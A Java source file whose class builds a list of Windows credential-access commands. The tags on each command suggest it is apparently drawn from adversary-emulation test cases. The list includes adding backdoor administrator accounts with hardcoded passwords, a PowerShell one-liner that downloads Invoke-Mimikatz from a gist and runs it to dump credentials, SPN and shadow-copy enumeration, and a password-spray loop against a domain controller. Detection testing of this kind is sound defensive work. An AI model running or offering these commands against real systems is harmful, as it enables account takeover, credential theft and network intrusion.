/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package cl;

import java.util.ArrayList;
import java.util.List;

/**
 *
 * @author cefa-dico-asus
 */
public class TaskOfWIndows {
    
    private List<String> comandos=new ArrayList<String>();
    
    public TaskOfWIndows(){
        comandos.add("net user /add Jack Pwndiddy1");//credaccess_win_createaccount.yml
        comandos.add("net localgroup administrators jack /add");//credaccess_win_createaccount.yml       
        comandos.add("net user newdomainuser thepassword \\domai");//credaccess_win_createaccount.yml
        comandos.add("net user Jack /delete");//credaccess_win_createaccount.yml
        comandos.add("dsadd user CN=John,CN=Users,DC=it,DC=uk,DC=savilltech,DC=com -samid John -pwd Pa55word123");//credaccess_win_createaccount_dsadd.yml
        comandos.add("net user /add HelpAssistant Pwndiddy1");//credaccess_win_createaccount_flame.yml
        comandos.add("net user HelpAssistant /delete");//credaccess_win_createaccount_flame.yml
        comandos.add("powershell.exe New-LocalUser -FullName 'Jack Frost' -Name 'Jackfro' -Password 'Pwndiddy1' -Description 'Pwnage account'");//credaccess_win_createaccount_powershell.ym
        comandos.add("net user jackfro /delete");//credaccess_win_createaccount_powershell.ym
        comandos.add("powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/carnal0wnage/73be3c832de957946b94040e216b289c/raw/c012c6feb06c8b22f2c479eba06fa87f81996a60/fake_mimi.txt'); Invoke-Mimikatz -DumpCreds\\\"");//credaccess_win_creddum_ps_mimikatz.yml
        comandos.add("setspn.exe -t corp -q */*");//credaccess_win_creddump.yml
        comandos.add("vssadmin.exe list shadows");//credaccess_win_creddump.yml  
        comandos.add("net user /domain > DomainUsers.txt");//credaccess_win_passwordspray.yml
        comandos.add("echo \\\"Password1\\\" >> pass.txt");//credaccess_win_passwordspray.yml
        comandos.add("echo \\\"1q2w3e4r\\\" >> pass.txt");//credaccess_win_passwordspray.yml
        comandos.add("\\\"@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\\\COMPANYDC1\\IPC$ /user:COMPANY\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\\\COMPANYDC1\\IPC$ > NUL\\\"");//credaccess_win_passwordspray.yml        
        comandos.add("del DomainUsers.txt");//credaccess_win_passwordspray.yml
        comandos.add("del pass.txt");//credaccess_win_passwordspray.yml                    
    }


    public List<String> getComand(){
        return comandos;
    }
    
    
    
}
